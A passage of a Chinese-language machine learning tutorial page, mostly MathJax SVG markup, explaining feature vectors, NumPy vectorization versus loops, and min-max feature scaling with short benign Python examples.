52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1905.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(2294.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)" style="stroke-width: 3;"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(3794.6,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(4044.6,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">å¹³</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">æ–¹</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">ç±³</text></g><g data-mml-node="mo" transform="translate(7044.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(7489.2,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(7739.2,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(8239.2,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(8489.2,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">æ¥¼</text></g><g data-mml-node="mo" transform="translate(9489.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(9933.9,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(10183.9,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)" style="stroke-width: 3;"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)" style="stroke-width: 3;"/><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1500,0)" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(12183.9,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(12433.9,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">å¹´</text></g><g data-mml-node="mo" transform="translate(13433.9,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(13878.6,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(14128.6,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)" style="stroke-width: 3;"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(15628.6,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(15878.6,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">ç±³</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">åˆ°</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">åœ°</text><text data-variant="normal" transform="translate(3000,0) scale(1,-1)" font-size="884px" font-family="serif">é“</text></g><g data-mml-node="mo" transform="translate(19878.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(20323.2,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(20573.2,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">ç²¾</text></g><g data-mml-node="mi" transform="translate(21573.2,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">è£…</text></g><g data-mml-node="mi" transform="translate(22573.2,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">ä¿®</text></g><g data-mml-node="mo" transform="translate(23573.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>x</mi><mo>=</mo><mo stretchy="false">(</mo><mn>120</mn><mtext>Â </mtext><mtext>å¹³æ–¹ç±³</mtext><mo>,</mo><mtext>Â </mtext><mn>5</mn><mtext>Â </mtext><mtext>æ¥¼</mtext><mo>,</mo><mtext>Â </mtext><mn>2008</mn><mtext>Â </mtext><mtext>å¹´</mtext><mo>,</mo><mtext>Â </mtext><mn>300</mn><mtext>Â </mtext><mtext>ç±³åˆ°åœ°é“</mtext><mo>,</mo><mtext>Â </mtext><mi mathvariant="normal">ç²¾</mi><mi mathvariant="normal">è£…</mi><mi mathvariant="normal">ä¿®</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container><p>æ¨¡å‹å°±æ ¹æ®è¿™ä¸€æ•´ç»„ç‰¹å¾ï¼Œæ¥å­¦ä¹ é¢„æµ‹ç»“æœï¼Œæ¯”å¦‚æˆ¿ä»·ã€‚</p><h3 id="å‘é‡åŒ–">å‘é‡åŒ–</h3><p><strong>å‘é‡åŒ–ï¼ˆVectorizationï¼‰<strong>æŒ‡çš„æ˜¯ä½¿ç”¨</strong>å‘é‡æˆ–çŸ©é˜µè¿ç®—</strong>ä»£æ›¿ä¼ ç»Ÿçš„<strong>å¾ªç¯æ“ä½œ</strong>æ¥å¤„ç†æ•°æ®ï¼Œå°¤å…¶æ˜¯åœ¨æ¨¡å‹è®­ç»ƒå’Œæ¨ç†è¿‡ç¨‹ä¸­ã€‚è¿™ç§æ–¹å¼å¯ä»¥å¤§å¹…æå‡ç¨‹åºæ‰§è¡Œæ•ˆç‡ï¼Œå°¤å…¶åœ¨ä½¿ç”¨ <code>NumPy</code>ã€<code>Pandas</code> æˆ–<code>TensorFlow</code>ã€<code>PyTorch</code> ç­‰åº“æ—¶ï¼Œèƒ½å¤Ÿæ˜¾è‘—å‡å°‘è¿è¡Œæ—¶é—´ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>æ™®é€šåšæ³•ï¼Œä½¿ç”¨å¾ªç¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">w = [<span class="number">0.1</span>, <span class="number">0.2</span>, <span class="number">0.3</span>]</span><br><span class="line">y = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    y += x[i] * w[i]</span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure><p>å‘é‡åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">w = np.array([<span class="number">0.1</span>, <span class="number">0.2</span>, <span class="number">0.3</span>])</span><br><span class="line">y = np.dot(x, w)  <span class="comment"># ç‚¹ç§¯</span></span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure><h2 id="ç‰¹å¾ç¼©æ”¾-Feature-Scaling">ç‰¹å¾ç¼©æ”¾(Feature Scaling)</h2><p><strong>ç‰¹å¾ç¼©æ”¾</strong>æ˜¯æœºå™¨å­¦ä¹ ä¸­å¯¹è¾“å…¥ç‰¹å¾æ•°æ®è¿›è¡Œè§„èŒƒåŒ–æˆ–æ ‡å‡†åŒ–çš„è¿‡ç¨‹ï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯å°†ä¸åŒé‡çº²æˆ–èŒƒå›´çš„ç‰¹å¾è½¬æ¢åˆ°ç›¸åŒçš„å°ºåº¦ä¸Šã€‚è¿™æ ·åšå¯ä»¥æé«˜æ¨¡å‹çš„è®­ç»ƒæ•ˆç‡å’Œå‡†ç¡®æ€§ï¼Œå°¤å…¶å¯¹äºä»¥ä¸‹ç®—æ³•æ•ˆæœæ˜¾è‘—ï¼š</p><ul><li><strong>æ¢¯åº¦ä¸‹é™ç±»ç®—æ³•</strong>ï¼ˆå¦‚çº¿æ€§å›å½’ã€é€»è¾‘å›å½’ã€ç¥ç»ç½‘ç»œï¼‰ï¼šé¿å…æŸäº›ç‰¹å¾ä¸»å¯¼æ¢¯åº¦æ›´æ–°ã€‚</li><li><strong>åŸºäºè·ç¦»çš„ç®—æ³•</strong>ï¼ˆå¦‚<code>KNN</code>ã€<code>SVM</code>ã€<code>K-means</code>ï¼‰ï¼šè·ç¦»è®¡ç®—å¯¹ç‰¹å¾å°ºåº¦æ•æ„Ÿã€‚</li><li><strong>æ­£åˆ™åŒ–æ¨¡å‹</strong>ï¼šå¦‚<code>L1(Lasso)</code>ã€<code>L2(Ridge)</code>æ­£åˆ™åŒ–å¯¹ç‰¹å¾å°ºåº¦æ•æ„Ÿã€‚</li></ul><p>ä¾‹å¦‚ï¼š</p><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç‰¹å¾æ˜¯&quot;å¹´é¾„&quot;ï¼ŒèŒƒå›´ä»18å²åˆ°70å²ï¼Œè¿˜æœ‰ä¸€ä¸ªç‰¹å¾æ˜¯&quot;æ”¶å…¥&quot;ï¼ŒèŒƒå›´ä»2,000åˆ°200,000ï¼Œå¦‚æœä¸è¿›è¡Œç¼©æ”¾ï¼Œæ¨¡å‹å¯èƒ½ä¼šæ›´å…³æ³¨æ”¶å…¥ï¼Œè€Œå¿½ç•¥å¹´é¾„ã€‚è¿™ç§ç‰¹å¾é‡çº²çš„ä¸ä¸€è‡´ä¼šå½±å“æ¨¡å‹æ€§èƒ½ã€‚</p><h3 id="æœ€å°-æœ€å¤§ç¼©æ”¾ï¼ˆMin-Max-Scalingï¼‰"><strong>æœ€å°-æœ€å¤§ç¼©æ”¾ï¼ˆMin-Max Scalingï¼‰</strong></h3><p>å°†ç‰¹å¾ç¼©æ”¾åˆ° <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.526ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2000.7 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1222.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1722.7,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mo stretchy="false">[</mo><mn>0</mn><mo>,</mo><mn>1</mn><mo stretchy="false">]</mo></math></mjx-assistive-mml></mjx-container> æˆ–ä»»æ„æŒ‡å®šèŒƒå›´ï¼š</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -1.909ex;" xmlns="http://www.w3.org/2000/svg" width="17.308ex" height="4.757ex" role="img" focusable="false" viewbox="0 -1259 7650.1 2102.8" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(605,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1127.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(2183,0)"><g data-mml-node="mrow" transform="translate(919.5,676)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(1794.4,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mtext"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" style="stroke-width: 3;"/><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(833,0)" style="stroke-width: 3;"/><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(1111,0)" style="stroke-width: 3;"/></g></g></g></g><g data-mml-node="mrow" transform="translate(220,-686)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mtext"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" style="stroke-width: 3;"/><path data-c="61" d="M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 